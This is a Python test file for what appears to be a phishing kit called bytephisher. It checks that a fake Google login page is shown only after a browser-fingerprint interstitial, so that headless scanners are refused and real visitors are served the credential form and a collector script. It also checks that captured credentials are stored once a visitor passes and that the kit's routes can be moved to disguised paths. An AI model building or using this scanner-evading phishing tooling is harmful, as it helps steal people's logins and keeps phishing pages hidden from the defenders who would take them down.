"""The pre-serve human challenge on the STATIC server.

The challenge shipped proxy-only, so `--verify-first` did nothing in the default mode while
`tools/campaign.sh` passed it. These tests drive the real static server: the first hit must
be the interstitial, the verify route must issue the token, and the second hit must be the
page. A credential POST without the token must store nothing.
"""
import http.client
import json
import os
import sys
import tempfile
import threading
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from conftest import TEMPLATES, free_port  # noqa: E402

from core import capture as cap  # noqa: E402
from core import server as srv  # noqa: E402
from core import symbols as symbols_mod  # noqa: E402
from core.challenge import Challenge  # noqa: E402

pytestmark = pytest.mark.integration

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

HUMAN = {
    "webdriver": False, "languages": ["en-US", "en"], "timezone": "Asia/Kolkata",
    "offset": -330, "plugins": 5, "hardware": 8, "touch": False,
    "gl_renderer": "ANGLE (Intel, Intel(R) UHD Graphics Direct3D11)", "ua": UA,
    "interactions": 12, "fractional": 9, "dwell_ms": 2500,
}

HEADLESS = {"webdriver": True, "languages": [], "timezone": "", "plugins": 0,
            "gl_renderer": "SwiftShader", "ua": UA, "interactions": 0}


class _Static:
    def __init__(self, challenge=True, hook_base="/__bh"):
        self.db_path = os.path.join(tempfile.mkdtemp(prefix="bh_static_chal_"), "c.db")
        self.port = free_port()
        self.httpd, _ = srv.serve(
            TEMPLATES, os.path.join(TEMPLATES, "03_google"), self.port, self.db_path,
            geo_provider="off", site_name="google", campaign="chal-test",
            hook_base=hook_base, challenge=Challenge(ttl=300) if challenge else None,
            symbols=symbols_mod.Symbols.fixed())
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        self.db = cap.CaptureDB(self.db_path)

    def request(self, path="/", method="GET", headers=None, body=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=15)
        h = {"Host": "127.0.0.1", "User-Agent": UA,
             "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
        h.update(headers or {})
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        # the header LIST, not a dict: a response can set several cookies and dict() keeps
        # only the last one, which silently loses the challenge token
        out = (r.status, r.getheaders(), r.read().decode("utf-8", "replace"))
        conn.close()
        return out

    def close(self):
        self.httpd.shutdown()
        self.db.close()


def _cookies(headers):
    """Every cookie from every Set-Cookie header."""
    out = {}
    for name, value in (headers or []):
        if name.lower() != "set-cookie":
            continue
        for part in str(value).split(","):
            if "=" not in part:
                continue
            key, _, val = part.partition("=")
            out[key.strip()] = val.split(";")[0].strip()
    return out


def _header(headers, name):
    for k, v in (headers or []):
        if k.lower() == name.lower():
            return v
    return ""


class TestTheStaticChallenge:

    def test_the_first_hit_is_the_interstitial_not_the_page(self):
        s = _Static()
        try:
            status, headers, body = s.request("/")
            assert status == 200
            assert "Checking your browser" in body
            assert "__bh/intel.js" not in body, "the collector was served before the pass"
            assert "<form" not in body, "the template was served before the pass"
            assert "no-store" in _header(headers, "Cache-Control")
        finally:
            s.close()

    def test_a_pass_issues_the_token_and_the_page_follows(self):
        s = _Static()
        try:
            _st, headers, _b = s.request("/")
            sid_cookie = _cookies(headers).get(symbols_mod.Symbols.fixed().intel, "")
            body = json.dumps(HUMAN).encode()
            status, vheaders, vbody = s.request(
                "/__bh/verify", method="POST",
                headers={"Content-Type": "application/json",
                         "Cookie": f"{symbols_mod.Symbols.fixed().intel}={sid_cookie}"},
                body=body)
            assert status == 200 and json.loads(vbody)["ok"] is True, vbody
            token = _cookies(vheaders).get(symbols_mod.Symbols.fixed().session + "v", "")
            assert token, f"no challenge token in {vheaders}"
            status2, _h2, page = s.request("/", headers={
                "Cookie": f"{symbols_mod.Symbols.fixed().intel}={sid_cookie}; "
                          f"{symbols_mod.Symbols.fixed().session}v={token}"})
            assert status2 == 200
            assert "Checking your browser" not in page
            assert "intel.js" in page, "the real page (with the collector) was not served"
        finally:
            s.close()

    def test_a_headless_report_is_refused(self):
        s = _Static()
        try:
            _st, headers, _b = s.request("/")
            sid_cookie = _cookies(headers).get(symbols_mod.Symbols.fixed().intel, "")
            status, vheaders, body = s.request(
                "/__bh/verify", method="POST",
                headers={"Content-Type": "application/json",
                         "Cookie": f"{symbols_mod.Symbols.fixed().intel}={sid_cookie}"},
                body=json.dumps(HEADLESS).encode())
            payload = json.loads(body)
            assert payload["ok"] is False and payload["reasons"], payload
            assert not _cookies(vheaders).get(symbols_mod.Symbols.fixed().session + "v")
        finally:
            s.close()

    def test_a_credential_post_without_the_token_stores_nothing(self):
        s = _Static()
        try:
            status, _h, body = s.request(
                "/", method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body="username=ravi@corp.test&password=S3cret")
            assert status == 200 and "Checking your browser" in body
            assert s.db.all(limit=10) == [], "a credential POST was stored without a pass"
        finally:
            s.close()

    def test_our_own_routes_are_never_challenged(self):
        s = _Static()
        try:
            # /__bh/live is POST-only, so a GET is a 405 there; the rest answer 200.
            expected = {"/__bh/intel.js": (200,), "/__bh/live": (200, 405),
                        "/health": (200,), "/px.gif": (200,)}
            for path, wanted in expected.items():
                status, _h, body = s.request(path)
                assert "Checking your browser" not in body, path
                assert status in wanted, (path, status)
        finally:
            s.close()

    def test_an_asset_fetch_is_not_challenged(self):
        s = _Static()
        try:
            _st, _h, body = s.request("/style.css", headers={"Accept": "text/css,*/*;q=0.1"})
            assert "Checking your browser" not in body
        finally:
            s.close()

    def test_without_the_challenge_the_page_is_immediate(self):
        s = _Static(challenge=False)
        try:
            _st, _h, body = s.request("/")
            assert "Checking your browser" not in body and "intel.js" in body
        finally:
            s.close()

    def test_the_interstitial_moves_with_the_hook_path(self):
        # the verify route has to follow --hook-path or a visitor can never pass
        s = _Static(hook_base="/assets/v2/x7f3")
        try:
            _st, _h, body = s.request("/")
            assert "/assets/v2/x7f3/verify" in body
        finally:
            s.close()

    def test_a_refusal_is_recorded_on_the_session(self):
        s = _Static()
        try:
            _st, headers, _b = s.request("/")
            sid_cookie = _cookies(headers).get(symbols_mod.Symbols.fixed().intel, "")
            s.request("/__bh/verify", method="POST",
                      headers={"Content-Type": "application/json",
                               "Cookie": f"{symbols_mod.Symbols.fixed().intel}={sid_cookie}"},
                      body=json.dumps(HEADLESS).encode())
            rec = s.db.session_get(sid_cookie)
            assert rec and (rec.get("meta") or {}).get("challenge"), "the refusal was not stored"
        finally:
            s.close()


class TestTheCliBuildsItInStaticMode:

    def test_the_startup_line_says_the_challenge_is_on(self, tmp_path):
        import subprocess
        env = dict(os.environ, BYTEPHISHER_HOME=str(tmp_path))
        proc = subprocess.Popen(
            [sys.executable, os.path.join(os.path.dirname(os.path.dirname(
                os.path.abspath(__file__))), "bytephisher.py"),
             "-o", "03_google", "--no-tui", "--geo", "off", "--verify-first", "-p",
             str(free_port())],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, cwd=str(tmp_path),
            env=env)
        try:
            deadline = time.time() + 30
            seen = ""
            while time.time() < deadline:
                line = proc.stdout.readline()
                if not line:
                    break
                seen += line
                if "challenge ON" in seen:
                    break
            assert "challenge ON" in seen, seen[-600:]
        finally:
            proc.terminate()
            proc.wait(timeout=10)
